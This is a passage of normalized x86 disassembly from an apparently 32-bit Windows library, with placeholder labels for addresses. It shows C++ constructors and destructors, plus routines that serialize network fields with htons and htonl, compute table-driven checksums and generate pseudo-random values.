mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi - 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10034740
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b229
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x10 ] 0x0
cmp [ edi - 0xc ] 0x0
je r-xdata
mov eax [ edi - 0x24 ]
lea ecx [ edi - 0x24 ]
add edi 0xffffffe4
push edi
call [ eax ]
mov esi [ ebp + 0x8 ]
mov ecx esi
push 0xffffffff
push 0x0
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
call sub_100018b0
mov esi [ ebp + 0x8 ]
lea ecx [ edi - 0x1c ]
push 0xffffffff
push 0x0
push ecx
mov [ esi + 0x14 ] 0xf
mov ecx esi
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
call sub_100018b0
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10034800
push ebp
mov ebp esp
push 0xffffffff
push sub_100526f3
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x1c ] r--data
call [ GetTickCount@IAT ]
mov [ esi + 0x20 ] eax
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x18 ] 0x1
mov [ esi + 0x14 ] 0x1
mov [ esi + 0xc ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_100348a0
push ebp
mov ebp esp
push 0xffffffff
push sub_100526f3
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ esi + 0x1c ] r--data
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10034940
push ebp
mov ebp esp
push 0xffffffff
push sub_100517b0
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
call sub_10007010
mov [ esi + 0xc ] eax
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi + 0xc ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
sub esp 0x18
lea eax [ ebp + 0x8 ]
mov ecx esp
mov [ ebp - 0x10 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x1
mov ecx [ esi + 0xc ]
mov eax [ ecx ]
mov [ ebp - 0x4 ] 0x0
call [ eax + 0x8 ]
test eax eax
jne r-xdata
mov [ ebp + 0x1c ] 0xf
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x18
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
mov [ esi + 0xc ] 0x0
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_10034a20
push ebp
mov ebp esp
push 0xffffffff
push sub_10052749
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x5c ] 0x0
mov [ ebp - 0x68 ] edi
mov eax [ ecx ]
mov [ ebp - 0x58 ] ecx
mov eax [ eax + 0xc ]
call eax
cmp [ ebx + 0x10 ] 0x0
mov [ ebp - 0x41 ] al
mov [ ebp - 0x48 ] 0x0
je r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
or al 0x10
mov [ ebp - 0x41 ] al
xor esi esi
mov [ ebp - 0x50 ] r--data
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ebx + 0x18 ] esi
je r-xdata
or al 0x20
mov [ ebp - 0x41 ] al
mov ecx [ ebp - 0x58 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
test eax eax
je r-xdata
imul eax [ ebx + 0x20 ] 0x343fd
or [ ebp - 0x41 ] 0x80
add eax 0x269ec3
mov [ ebx + 0x20 ] eax
shr eax 0x10
push eax
call [ htons@IAT ]
movzx eax ax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] eax
or esi 0xffffffff
mov edx 0x2
mov ecx [ ebp - 0x58 ]
lea edx [ ebp - 0x28 ]
push edx
mov eax [ ecx ]
call [ eax + 0x4 ]
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0x28 ]
cmp [ ebp - 0x14 ] 0x10
not esi
mov edx [ ebp - 0x18 ]
cmovae ecx [ ebp - 0x28 ]
test edx edx
je r-xdata
push [ ebx + 0x4 ]
call [ htonl@IAT ]
mov [ ebp - 0x64 ] eax
mov eax [ ebx + 0x8 ]
movzx eax ax
push eax
call [ htons@IAT ]
mov esi [ ebp - 0x4c ]
lea ecx [ ebp - 0x64 ]
movzx eax ax
not esi
mov [ ebp - 0x54 ] eax
mov edx 0x4
nop
movzx eax [ ecx ]
lea ecx [ ecx + 0x1 ]
xor eax esi
shr esi 0x8
and eax 0xff
xor esi [ eax * 4 + r--data ]
dec edx
jne r-xdata
not esi
mov [ ebp - 0x4c ] esi
not esi
push esi
mov [ ebp - 0x4c ] esi
call [ htonl@IAT ]
mov [ ebp - 0x60 ] eax
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
cmp [ ebx + 0x14 ] 0x0
mov [ ebp - 0x5c ] 0x1
je r-xdata
movzx eax [ ecx ]
lea ecx [ ecx + 0x1 ]
xor eax esi
shr esi 0x8
and eax 0xff
xor esi [ eax * 4 + r--data ]
dec edx
jne r-xdata
movzx eax [ ecx ]
lea ecx [ ecx + 0x1 ]
xor eax esi
shr esi 0x8
and eax 0xff
xor esi [ eax * 4 + r--data ]
dec edx
jne r-xdata
not esi
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4c ] esi
mov edx 0x2
not esi
lea esp [ esp ]
push 0x1
lea eax [ ebp - 0x41 ]
mov ecx edi
push eax
call sub_10005470
cmp [ ebx + 0x18 ] 0x0
je r-xdata
push 0x4
lea eax [ ebp - 0x60 ]
mov ecx edi
push eax
call sub_10005470
movzx eax [ ecx ]
lea ecx [ ecx + 0x1 ]
xor eax esi
shr esi 0x8
and eax 0xff
xor esi [ eax * 4 + r--data ]
dec edx
jne r-xdata
not esi
mov [ ebp - 0x4c ] esi
cmp [ ebx + 0xc ] 0x0
lea eax [ ebp - 0x28 ]
je r-xdata
push 0x2
lea eax [ ebp - 0x48 ]
mov ecx edi
push eax
call sub_10005470
push 0xffffffff
push 0x0
push eax
mov ecx edi
call sub_100050b0
push 0x1
sub esp 0x18
mov ecx esp
mov [ ebp - 0x54 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x40 ]
mov eax [ ebx + 0xc ]
push ecx
mov eax [ eax ]
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebx + 0xc ]
call [ eax + 0xc ]
mov [ ebp - 0x4 ] 0x4
mov ecx edi
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x2c ] 0x10
jb r-xdata
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax edi
mov [ ebp - 0x50 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x8
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x2c ] 0xf
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] 0x0
jmp r-xdata
push [ ebp - 0x40 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
sub_10034d10
push ebp
mov ebp esp
push 0xffffffff
push sub_100527a2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx ecx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] 0x0
mov [ edx + 0x4 ] r--data
mov [ edx + 0x2c ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ edx + 0x4 ]
mov [ edx ] r--data
mov [ ebp - 0x10 ] 0x1
mov eax [ eax + 0x4 ]
mov [ eax + edx + 0x4 ] r--data
mov eax [ edx + 0x4 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x20 ]
mov [ ecx + edx ] eax
mov [ edx + 0x1c ] 0xf
mov [ edx + 0x18 ] 0x0
mov [ edx + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x3
mov eax [ edx + 0x4 ]
mov [ edx ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + edx + 0x4 ] r--data
mov eax [ edx + 0x4 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x28 ]
mov [ ecx + edx ] eax
mov eax [ ebp + 0x8 ]
mov [ edx + 0x20 ] eax
mov ax [ ebp + 0xc ]
mov [ edx + 0x24 ] ax
mov [ ebp - 0x4 ] 0xffffffff
mov eax edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0xc
sub_10034de0
push ebp
mov ebp esp
push esi
push edi
lea edi [ ecx - 0x2c ]
lea ecx [ edi + 0x2c ]
call sub_10034e10
test [ ebp + 0x8 ] 0x1
mov [ edi + 0x2c ] r--data
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
push edi
call j_sub_1003f3e3#2
add esp 0x4
sub_10034e10
push ebp
mov ebp esp
push 0xffffffff
push sub_100527d6
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov eax [ ecx - 0x28 ]
mov [ ecx - 0x2c ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x28 ] r--data
mov eax [ ecx - 0x28 ]
mov edx [ eax + 0x4 ]
lea eax [ edx - 0x28 ]
mov [ edx + ecx - 0x2c ] eax
mov [ ebp - 0x4 ] 0xffffffff
lea esi [ ecx - 0x8 ]
mov eax [ esi - 0x20 ]
mov [ esi - 0x24 ] r--data
mov [ ebp - 0x10 ] esi
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x20 ] r--data
mov eax [ esi - 0x20 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x20 ]
mov [ ecx + esi - 0x24 ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi - 0x8 ] 0x10
jb r-xdata
mov [ esi - 0x8 ] 0xf
mov [ esi - 0xc ] 0x0
mov [ esi - 0x1c ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi - 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10034ed0
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
push [ esi + 0x20 ]
call [ htonl@IAT ]
mov [ ebp - 0x4 ] eax
movzx eax [ esi + 0x24 ]
push eax
call [ htons@IAT ]
mov ecx [ ebp + 0x8 ]
movzx eax ax
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push 0x4
push eax
call sub_10005470
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_10005470
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10034f50
push ebp
mov ebp esp
push 0xffffffff
push sub_10052845
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x4 ] r--data
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x20 ]
mov [ ecx + esi ] eax
mov [ esi + 0x1c ] 0xf
mov [ esi + 0x18 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x4
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x4 ] r--data
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x34 ]
mov [ ecx + esi ] eax
lea ecx [ esi + 0x28 ]
mov [ ecx ] 0x0
mov [ ecx + 0x4 ] 0x0
mov [ ecx + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x5
mov ax [ ebp + 0x8 ]
mov [ esi + 0x20 ] ax
mov ax [ ebp + 0xc ]
mov [ esi + 0x22 ] ax
mov ax [ ebp + 0x10 ]
mov [ esi + 0x24 ] ax
lea eax [ ebp + 0x14 ]
push eax
call sub_100352d0
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov [ esi + 0x4 ] r--data
mov [ esi + 0x38 ] r--data
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x1c
push eax
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp + 0x14 ] 0x0
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x1c ] 0x0
sub_10035080
push ebp
mov ebp esp
push esi
push edi
lea edi [ ecx - 0x38 ]
lea ecx [ edi + 0x38 ]
call sub_100350b0
test [ ebp + 0x8 ] 0x1
mov [ edi + 0x38 ] r--data
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
push edi
call j_sub_1003f3e3#2
add esp 0x4
sub_100350b0
push ebp
mov ebp esp
push 0xffffffff
push sub_10052881
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x34 ]
mov [ esi - 0x38 ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x34 ] r--data
mov eax [ esi - 0x34 ]
mov edx [ eax + 0x4 ]
lea eax [ edx - 0x34 ]
mov [ edx + esi - 0x38 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ esi - 0x10 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
add esi 0xffffffec
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x20 ]
mov [ esi - 0x24 ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x20 ] r--data
mov eax [ esi - 0x20 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x20 ]
mov [ ecx + esi - 0x24 ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi - 0x8 ] 0x10
jb r-xdata
push eax
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi - 0x10 ] 0x0
mov [ esi - 0xc ] 0x0
mov [ esi - 0x8 ] 0x0
mov [ esi - 0x8 ] 0xf
mov [ esi - 0xc ] 0x0
mov [ esi - 0x1c ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi - 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10035190
push ebp
mov ebp esp
sub esp 0x1c
push ebx
mov ebx [ htons@IAT ]
push edi
mov edi ecx
movzx eax [ edi + 0x20 ]
push eax
call ebx
movzx eax ax
mov [ ebp - 0x4 ] eax
movzx eax [ edi + 0x22 ]
push eax
call ebx
movzx eax ax
mov [ ebp - 0x8 ] eax
movzx eax [ edi + 0x24 ]
push eax
call ebx
mov ecx [ edi + 0x2c ]
sub ecx [ edi + 0x28 ]
movzx eax ax
mov [ ebp - 0xc ] eax
mov eax 0x2aaaaaab
imul ecx
sar edx 0x1
mov eax edx
shr eax 0x1f
add eax edx
push eax
call ebx
mov ebx [ ebp + 0x8 ]
mov ecx ebx
movzx eax ax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x4 ]
push 0x2
push eax
call sub_10005470
push 0x2
lea eax [ ebp - 0x8 ]
mov ecx ebx
push eax
call sub_10005470
push 0x2
lea eax [ ebp - 0xc ]
mov ecx ebx
push eax
call sub_10005470
push 0x2
lea eax [ ebp - 0x10 ]
mov ecx ebx
push eax
call sub_10005470
xor ecx ecx
mov eax 0x2aaaaaab
mov [ ebp + 0x8 ] ecx
mov ecx [ edi + 0x2c ]
sub ecx [ edi + 0x28 ]
imul ecx
sar edx 0x1
mov eax edx
shr eax 0x1f
add eax edx
je r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push esi
xor esi esi
mov eax [ edi + 0x28 ]
movzx eax [ esi + eax ]
push eax
call [ htons@IAT ]
movzx eax ax
mov [ ebp - 0x14 ] eax
mov eax [ edi + 0x28 ]
push [ esi + eax + 0x4 ]
call [ htonl@IAT ]
mov [ ebp - 0x18 ] eax
mov eax [ edi + 0x28 ]
push [ esi + eax + 0x8 ]
call [ htonl@IAT ]
mov [ ebp - 0x1c ] eax
mov ecx ebx
push 0x2
lea eax [ ebp - 0x14 ]
push eax
call sub_10005470
push 0x4
lea eax [ ebp - 0x18 ]
mov ecx ebx
push eax
call sub_10005470
push 0x4
lea eax [ ebp - 0x1c ]
mov ecx ebx
push eax
call sub_10005470
mov ecx [ edi + 0x2c ]
lea esi [ esi + 0xc ]
sub ecx [ edi + 0x28 ]
mov eax 0x2aaaaaab
inc [ ebp + 0x8 ]
imul ecx
sar edx 0x1
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp + 0x8 ] eax
jb r-xdata
pop esi
sub_100352d0
push ebp
mov ebp esp
push 0xffffffff
push sub_100528a0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
mov [ ebp - 0x20 ] ebx
mov esi [ ebp + 0x8 ]
cmp ebx esi
je r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ esi + 0x4 ]
mov [ ebp - 0x18 ] edx
mov ecx [ esi ]
cmp ecx edx
jne r-xdata
sub edx ecx
mov eax 0x2aaaaaab
imul edx
sar edx 0x1
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x14 ] eax
mov edi [ ebx ]
mov edx [ ebx + 0x4 ]
sub edx edi
mov eax 0x2aaaaaab
imul edx
sar edx 0x1
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x14 ] eax
ja r-xdata
mov eax [ ebx ]
mov edx [ ebx + 0x8 ]
sub edx edi
mov eax 0x2aaaaaab
imul edx
sar edx 0x1
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp - 0x14 ] eax
ja r-xdata
mov edx [ ebp - 0x18 ]
cmp ecx edx
je r-xdata
test edi edi
je r-xdata
mov eax [ ebp - 0x1c ]
lea eax [ eax + eax * 2 ]
lea esi [ ecx + eax * 4 ]
push edi
mov edx esi
call sub_10035470
add esp 0x4
push [ ebp + 0x8 ]
push ecx
push [ ebx + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
mov ecx esi
call sub_100354a0
add esp 0xc
jmp r-xdata
mov ecx [ esi + 0x4 ]
sub ecx [ esi ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x1
mov eax edx
shr eax 0x1f
add eax edx
lea ecx [ eax + eax * 2 ]
mov eax [ ebx ]
lea eax [ eax + ecx * 4 ]
jmp r-xdata
lea esp [ esp ]
mov ecx [ esi + 0x4 ]
sub ecx [ esi ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x1
mov eax edx
shr eax 0x1f
add eax edx
push eax
mov ecx ebx
call sub_10003ba0
test al al
je r-xdata
push edi
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebx + 0x4 ] eax
movq xmm0 [ ecx ]
movq [ edi ] xmm0
mov eax [ ecx + 0x8 ]
mov [ edi + 0x8 ] eax
lea edi [ edi + 0xc ]
add ecx 0xc
cmp ecx edx
jne r-xdata
mov [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
push ecx
push [ ebx ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
call sub_100354a0
add esp 0xc
mov [ ebx + 0x4 ] eax
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
sub_10035470
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi edx
cmp ecx esi
je r-xdata
pop esi
pop ebp
retn
lea ecx [ ecx ]
movq xmm0 [ ecx ]
movq [ eax ] xmm0
mov edx [ ecx + 0x8 ]
add ecx 0xc
mov [ eax + 0x8 ] edx
add eax 0xc
cmp ecx esi
jne r-xdata
sub_100354a0
push ebp
mov ebp esp
push 0xffffffff
push sub_100528c0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi edx
mov edi ecx
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x8 ]
lea esp [ esp ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
push ebx
call sub_10004110
add ebx 0xc
mov [ ebp + 0x8 ] ebx
add edi 0xc
mov [ ebp - 0x14 ] edi
jmp r-xdata
cmp edi esi
je r-xdata
sub_10035560
push ebp
mov ebp esp
push 0xffffffff
push sub_10052925
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov esi [ ebp + 0x1c ]
mov edx [ ebp + 0x20 ]
mov [ ebp - 0x2c ] 0x0
mov [ ebx + 0x4 ] r--data
mov [ ebp - 0x30 ] ebx
mov [ ebx + 0x50 ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ ebx ] r--data
mov [ ebp - 0x2c ] 0x1
mov eax [ eax + 0x4 ]
mov [ eax + ebx + 0x4 ] r--data
mov eax [ ebx + 0x4 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x20 ]
mov [ ecx + ebx ] eax
mov [ ebx + 0x1c ] 0xf
mov [ ebx + 0x18 ] 0x0
mov [ ebx + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x3
lea edi [ ebx + 0x34 ]
mov eax [ ebx + 0x4 ]
mov [ ebx ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + ebx + 0x4 ] r--data
mov eax [ ebx + 0x4 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x4c ]
mov [ ecx + ebx ] eax
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0x28 ]
mov ax [ ebp + 0x8 ]
movq xmm0 [ ebp + 0xc ]
mov [ ebx + 0x20 ] ax
mov eax [ ebp + 0x14 ]
movq [ ebx + 0x24 ] xmm0
push esi
mov [ ebx + 0x2c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
push edx
mov [ ebx + 0x30 ] eax
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
call sub_100019e0
mov [ ebp - 0x4 ] 0x5
lea eax [ ebp - 0x28 ]
cmp edi eax
je r-xdata
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x20
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
lea eax [ ebp - 0x28 ]
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov ecx edi
push eax
mov [ edi ] 0x0
call sub_10005010
push [ edi ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10035700
push ebp
mov ebp esp
push esi
push edi
lea edi [ ecx - 0x50 ]
lea ecx [ edi + 0x50 ]
call sub_10035730
test [ ebp + 0x8 ] 0x1
mov [ edi + 0x50 ] r--data
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
push edi
call j_sub_1003f3e3#2
add esp 0x4
sub_10035730
push ebp
mov ebp esp
push 0xffffffff
push sub_10052971
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x4c ]
mov [ esi - 0x50 ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x4c ] r--data
mov eax [ esi - 0x4c ]
mov edx [ eax + 0x4 ]
lea eax [ edx - 0x4c ]
mov [ edx + esi - 0x50 ] eax
mov [ ebp - 0x4 ] 0x0
cmp [ esi - 0x8 ] 0x10
jb r-xdata
mov [ esi - 0x8 ] 0xf
mov [ esi - 0xc ] 0x0
mov [ esi - 0x1c ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
add esi 0xffffffd4
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x20 ]
mov [ esi - 0x24 ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x20 ] r--data
mov eax [ esi - 0x20 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x20 ]
mov [ ecx + esi - 0x24 ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi - 0x8 ] 0x10
jb r-xdata
push [ esi - 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi - 0x8 ] 0xf
mov [ esi - 0xc ] 0x0
mov [ esi - 0x1c ] 0x0
